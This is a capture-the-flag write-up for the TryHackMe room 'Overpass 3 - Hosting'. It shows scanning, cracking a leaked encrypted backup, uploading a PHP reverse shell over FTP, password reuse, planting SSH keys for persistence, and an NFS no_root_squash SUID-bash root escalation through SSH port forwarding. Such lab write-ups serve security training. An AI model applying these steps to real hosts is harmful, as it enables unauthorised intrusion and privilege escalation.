# [Overpass 3 - Hosting](https://tryhackme.com/room/overpass3hosting)

First order of business, `nmap`

```
# Nmap 7.91 scan initiated Wed May 26 16:01:05 2021 as: nmap -vvv -p 21,22,80 -sCV -oA init 10.10.205.177
Nmap scan report for box.ip (10.10.205.177)
Host is up, received syn-ack (0.28s latency).
Scanned at 2021-05-26 16:01:05 +07 for 22s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfSHQR3OtIeAUFx18phN/nfAIQ2uGHuJs0epoqF184E4Xr8fkjSFJHdA6GsVyGUjdlPqylT8Lpa+UhSSegb8sm1So8Nz42bthsftsOxMQVb/tpQzMUfjcxQOiyVmgxfEqs2Zzdv6GtxwgZWhKHt7T369ejxnVrZhn0m6jzQNfRhVoQe/jC20RKvBf8l8s6/SusbZR5SFfsg71KyrSKOXOxs12GhXkdbP32K3sXVEpWgfCfmIZAc2ZxNtL5uPCM4AOfjIFJHl1z9EX04ZjQ1rMzzOh9pD/b+W2mXt2nQGzRPnc8LyGDE0hFtw4+lBCoiH8zIt14S7dwbFFV1mWxbtZXVf7JhPiZDM2vBfqyowsDZ5oc2qyR+JEU4pqeVhRygs41isej/el19G8+ehz4W07KR97eM2omB25JehO7E4tpX1l8Imjs1XjqhhVuGE2tru/p62SRQOKzRZ19MCIFPxleSLorrHq/uuKdvd8j6rm0A9BrCsiB6gmPfal6Kr55vlU=
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAPAji9Nkb2U9TeP47Pz7BEa943WGOeu5XrRrTV0+CS0eGfNQyZkK6ZICNdeov65c2NWFPFsZTFjO8Sg+e2n/lM=
|   256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM/U6Td7C0nC8tiqS0Eejd+gQ3rjSyQW2DvcN0eoMFLS
80/tcp open  http    syn-ack Apache httpd 2.4.37 ((centos))
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: Overpass Hosting
Service Info: OS: Unix

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May 26 16:01:27 2021 -- 1 IP address (1 host up) scanned in 22.63 seconds
```

Doing a `gobuster` on the web server, we find `/backups` ...

```
$ gobuster dir -u 'http://box.ip/' -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html -t 100 -r -o root
/index.html           (Status: 200) [Size: 1770]
/backups              (Status: 200) [Size: 894]
```

... which has a `backup.zip` we can download, whose content are `CustomerDetails.xlsx.gpg` and `priv.key`.

We can decrypt the file `CustomerDetails.xlsx.gpg` with `priv.key`.

```sh
$ gpg --import priv.key
$ gpg --decrypt CustomerDetails.xlsx.gpg > CustomerDetails.xlsx
```

Viewing the extracted Excel file reveals the following

```csv
Customer, Name, Username, Password, Credit card number, CVC
Par. A. Doxx, paradox, ShibesAreGreat123, 4111 1111 4555 1142, 432
0day Montgomery, 0day, OllieIsTheBestDog, 5555 3412 4444 1115, 642
Muir Land, muirlandoracle, A11D0gsAreAw3s0me, 5103 2219 1119 9245, 737
```

... with the credentials ...

```
paradox:ShibesAreGreat123
0day:OllieIsTheBestDog
muirlandorade:A11D0gsAreAw3s0me
```

With those credentials, we can log into FTP as paradox, giving us the following files:

```
backups/backup.zip
hallway.jpg
index.html
main.css
overpass.svg
```

... which are the source files for the web application.

Trying to log into SSH, `paradox` doesn't allow password login, and the passwords can't be used for `0day` and `muirlandorade` in SSH.

Going back to FTP, I tried uploading a PHP reverse shell, which worked! This gives us a shell on the machine as `apache`, and we get our web flag

```sh
bash-4.4$ pwd
/usr/share/httpd
bash-4.4$ ls -la
total 24
drwxr-xr-x.  5 root root   63 Nov 17  2020 .
drwxr-xr-x. 81 root root 4096 Nov  8  2020 ..
drwxr-xr-x.  3 root root 4096 Nov  8  2020 error
drwxr-xr-x.  3 root root 8192 Nov  8  2020 icons
drwxr-xr-x.  3 root root  140 Nov  8  2020 noindex
-rw-r--r--.  1 root root   38 Nov 17  2020 web.flag
bash-4.4$ cat web.flag
thm{REDACTED}
```

Checking `/etc/passwd`,  we can see 2 non-root users: james and paradox

```sh
$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
james:x:1000:1000:James:/home/james:/bin/bash
paradox:x:1001:1001::/home/paradox:/bin/bash
```

Using the password for paradox we previously got, we can escalate to `paradox`.

```sh
$ su paradox
Password: ShibesAreGreat123
id
uid=1001(paradox) gid=1001(paradox) groups=1001(paradox)
```

To get persistence and a better shell, we can put our SSH key in paradox's `authorized_keys`.

As `paradox`, I rand [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) and got this interesting result

```
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
```

Checking the NFS shares ...

```sh
[paradox@localhost ~]$ showmount -e localhost
Export list for localhost:
/home/james *
```

... shows that `/home/james` can be mounted. Trying to mount it from our attacking machine ...

```sh
$ showmount -e box.ip
clnt_create: RPC: Unable to receive
```

It can only be mounted locally on the target machine, but we don't have permission to mount there. So what do we do? We mount it on our attacking machine using SSH port forwarding!

First, to check the NFS port on the target

```sh
[paradox@localhost ~]$ rpcinfo -p
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  20048  mountd
    100024    1   udp  52486  status
    100005    1   tcp  20048  mountd
    100024    1   tcp  47985  status
    100005    2   udp  20048  mountd
    100005    2   tcp  20048  mountd
    100005    3   udp  20048  mountd
    100005    3   tcp  20048  mountd
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  57797  nlockmgr
    100021    3   udp  57797  nlockmgr
    100021    4   udp  57797  nlockmgr
    100021    1   tcp  45137  nlockmgr
    100021    3   tcp  45137  nlockmgr
    100021    4   tcp  45137  nlockmgr
```

We see that `nfs` is on the default port 2049. To establish SSH port forwarding on our attacking machine which our injected SSH key, run

```sh
$ ssh -i key paradox@box.ip -L 2049:localhost:2049
```

The tunnel is established once we get a shell. Then, to mount jame's directory, run

```sh
$ sudo mount -t nfs localhost:/ ./mnt
$ ls mnt
user.flag
$ cat mnt/user.flag
thm{REDACTED}
```

... and we've got our user flag!

We can get a shell as `james` by putting our SSH key in james' `.ssh/authorized_keys` and SSH in.

Looking back at the [hacktricks article](https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe#remote-exploit), we see that we can set the SUID bit on our attacker machine and it will take affect on the victim machine. To exploit it:

1. Make a copy of `bash` in the mounted directory (I prefer copying from the victim's `/bin/bash` to avoid issues with different versions of things)
2. As `root`, on the attacking machine: `chown root:root bash; chmod +s bash`
3. On the victim's machine: `./bash -p`
4. profit

With that, you should have a root shell and can grab the root flag in `/root/root.flag`.
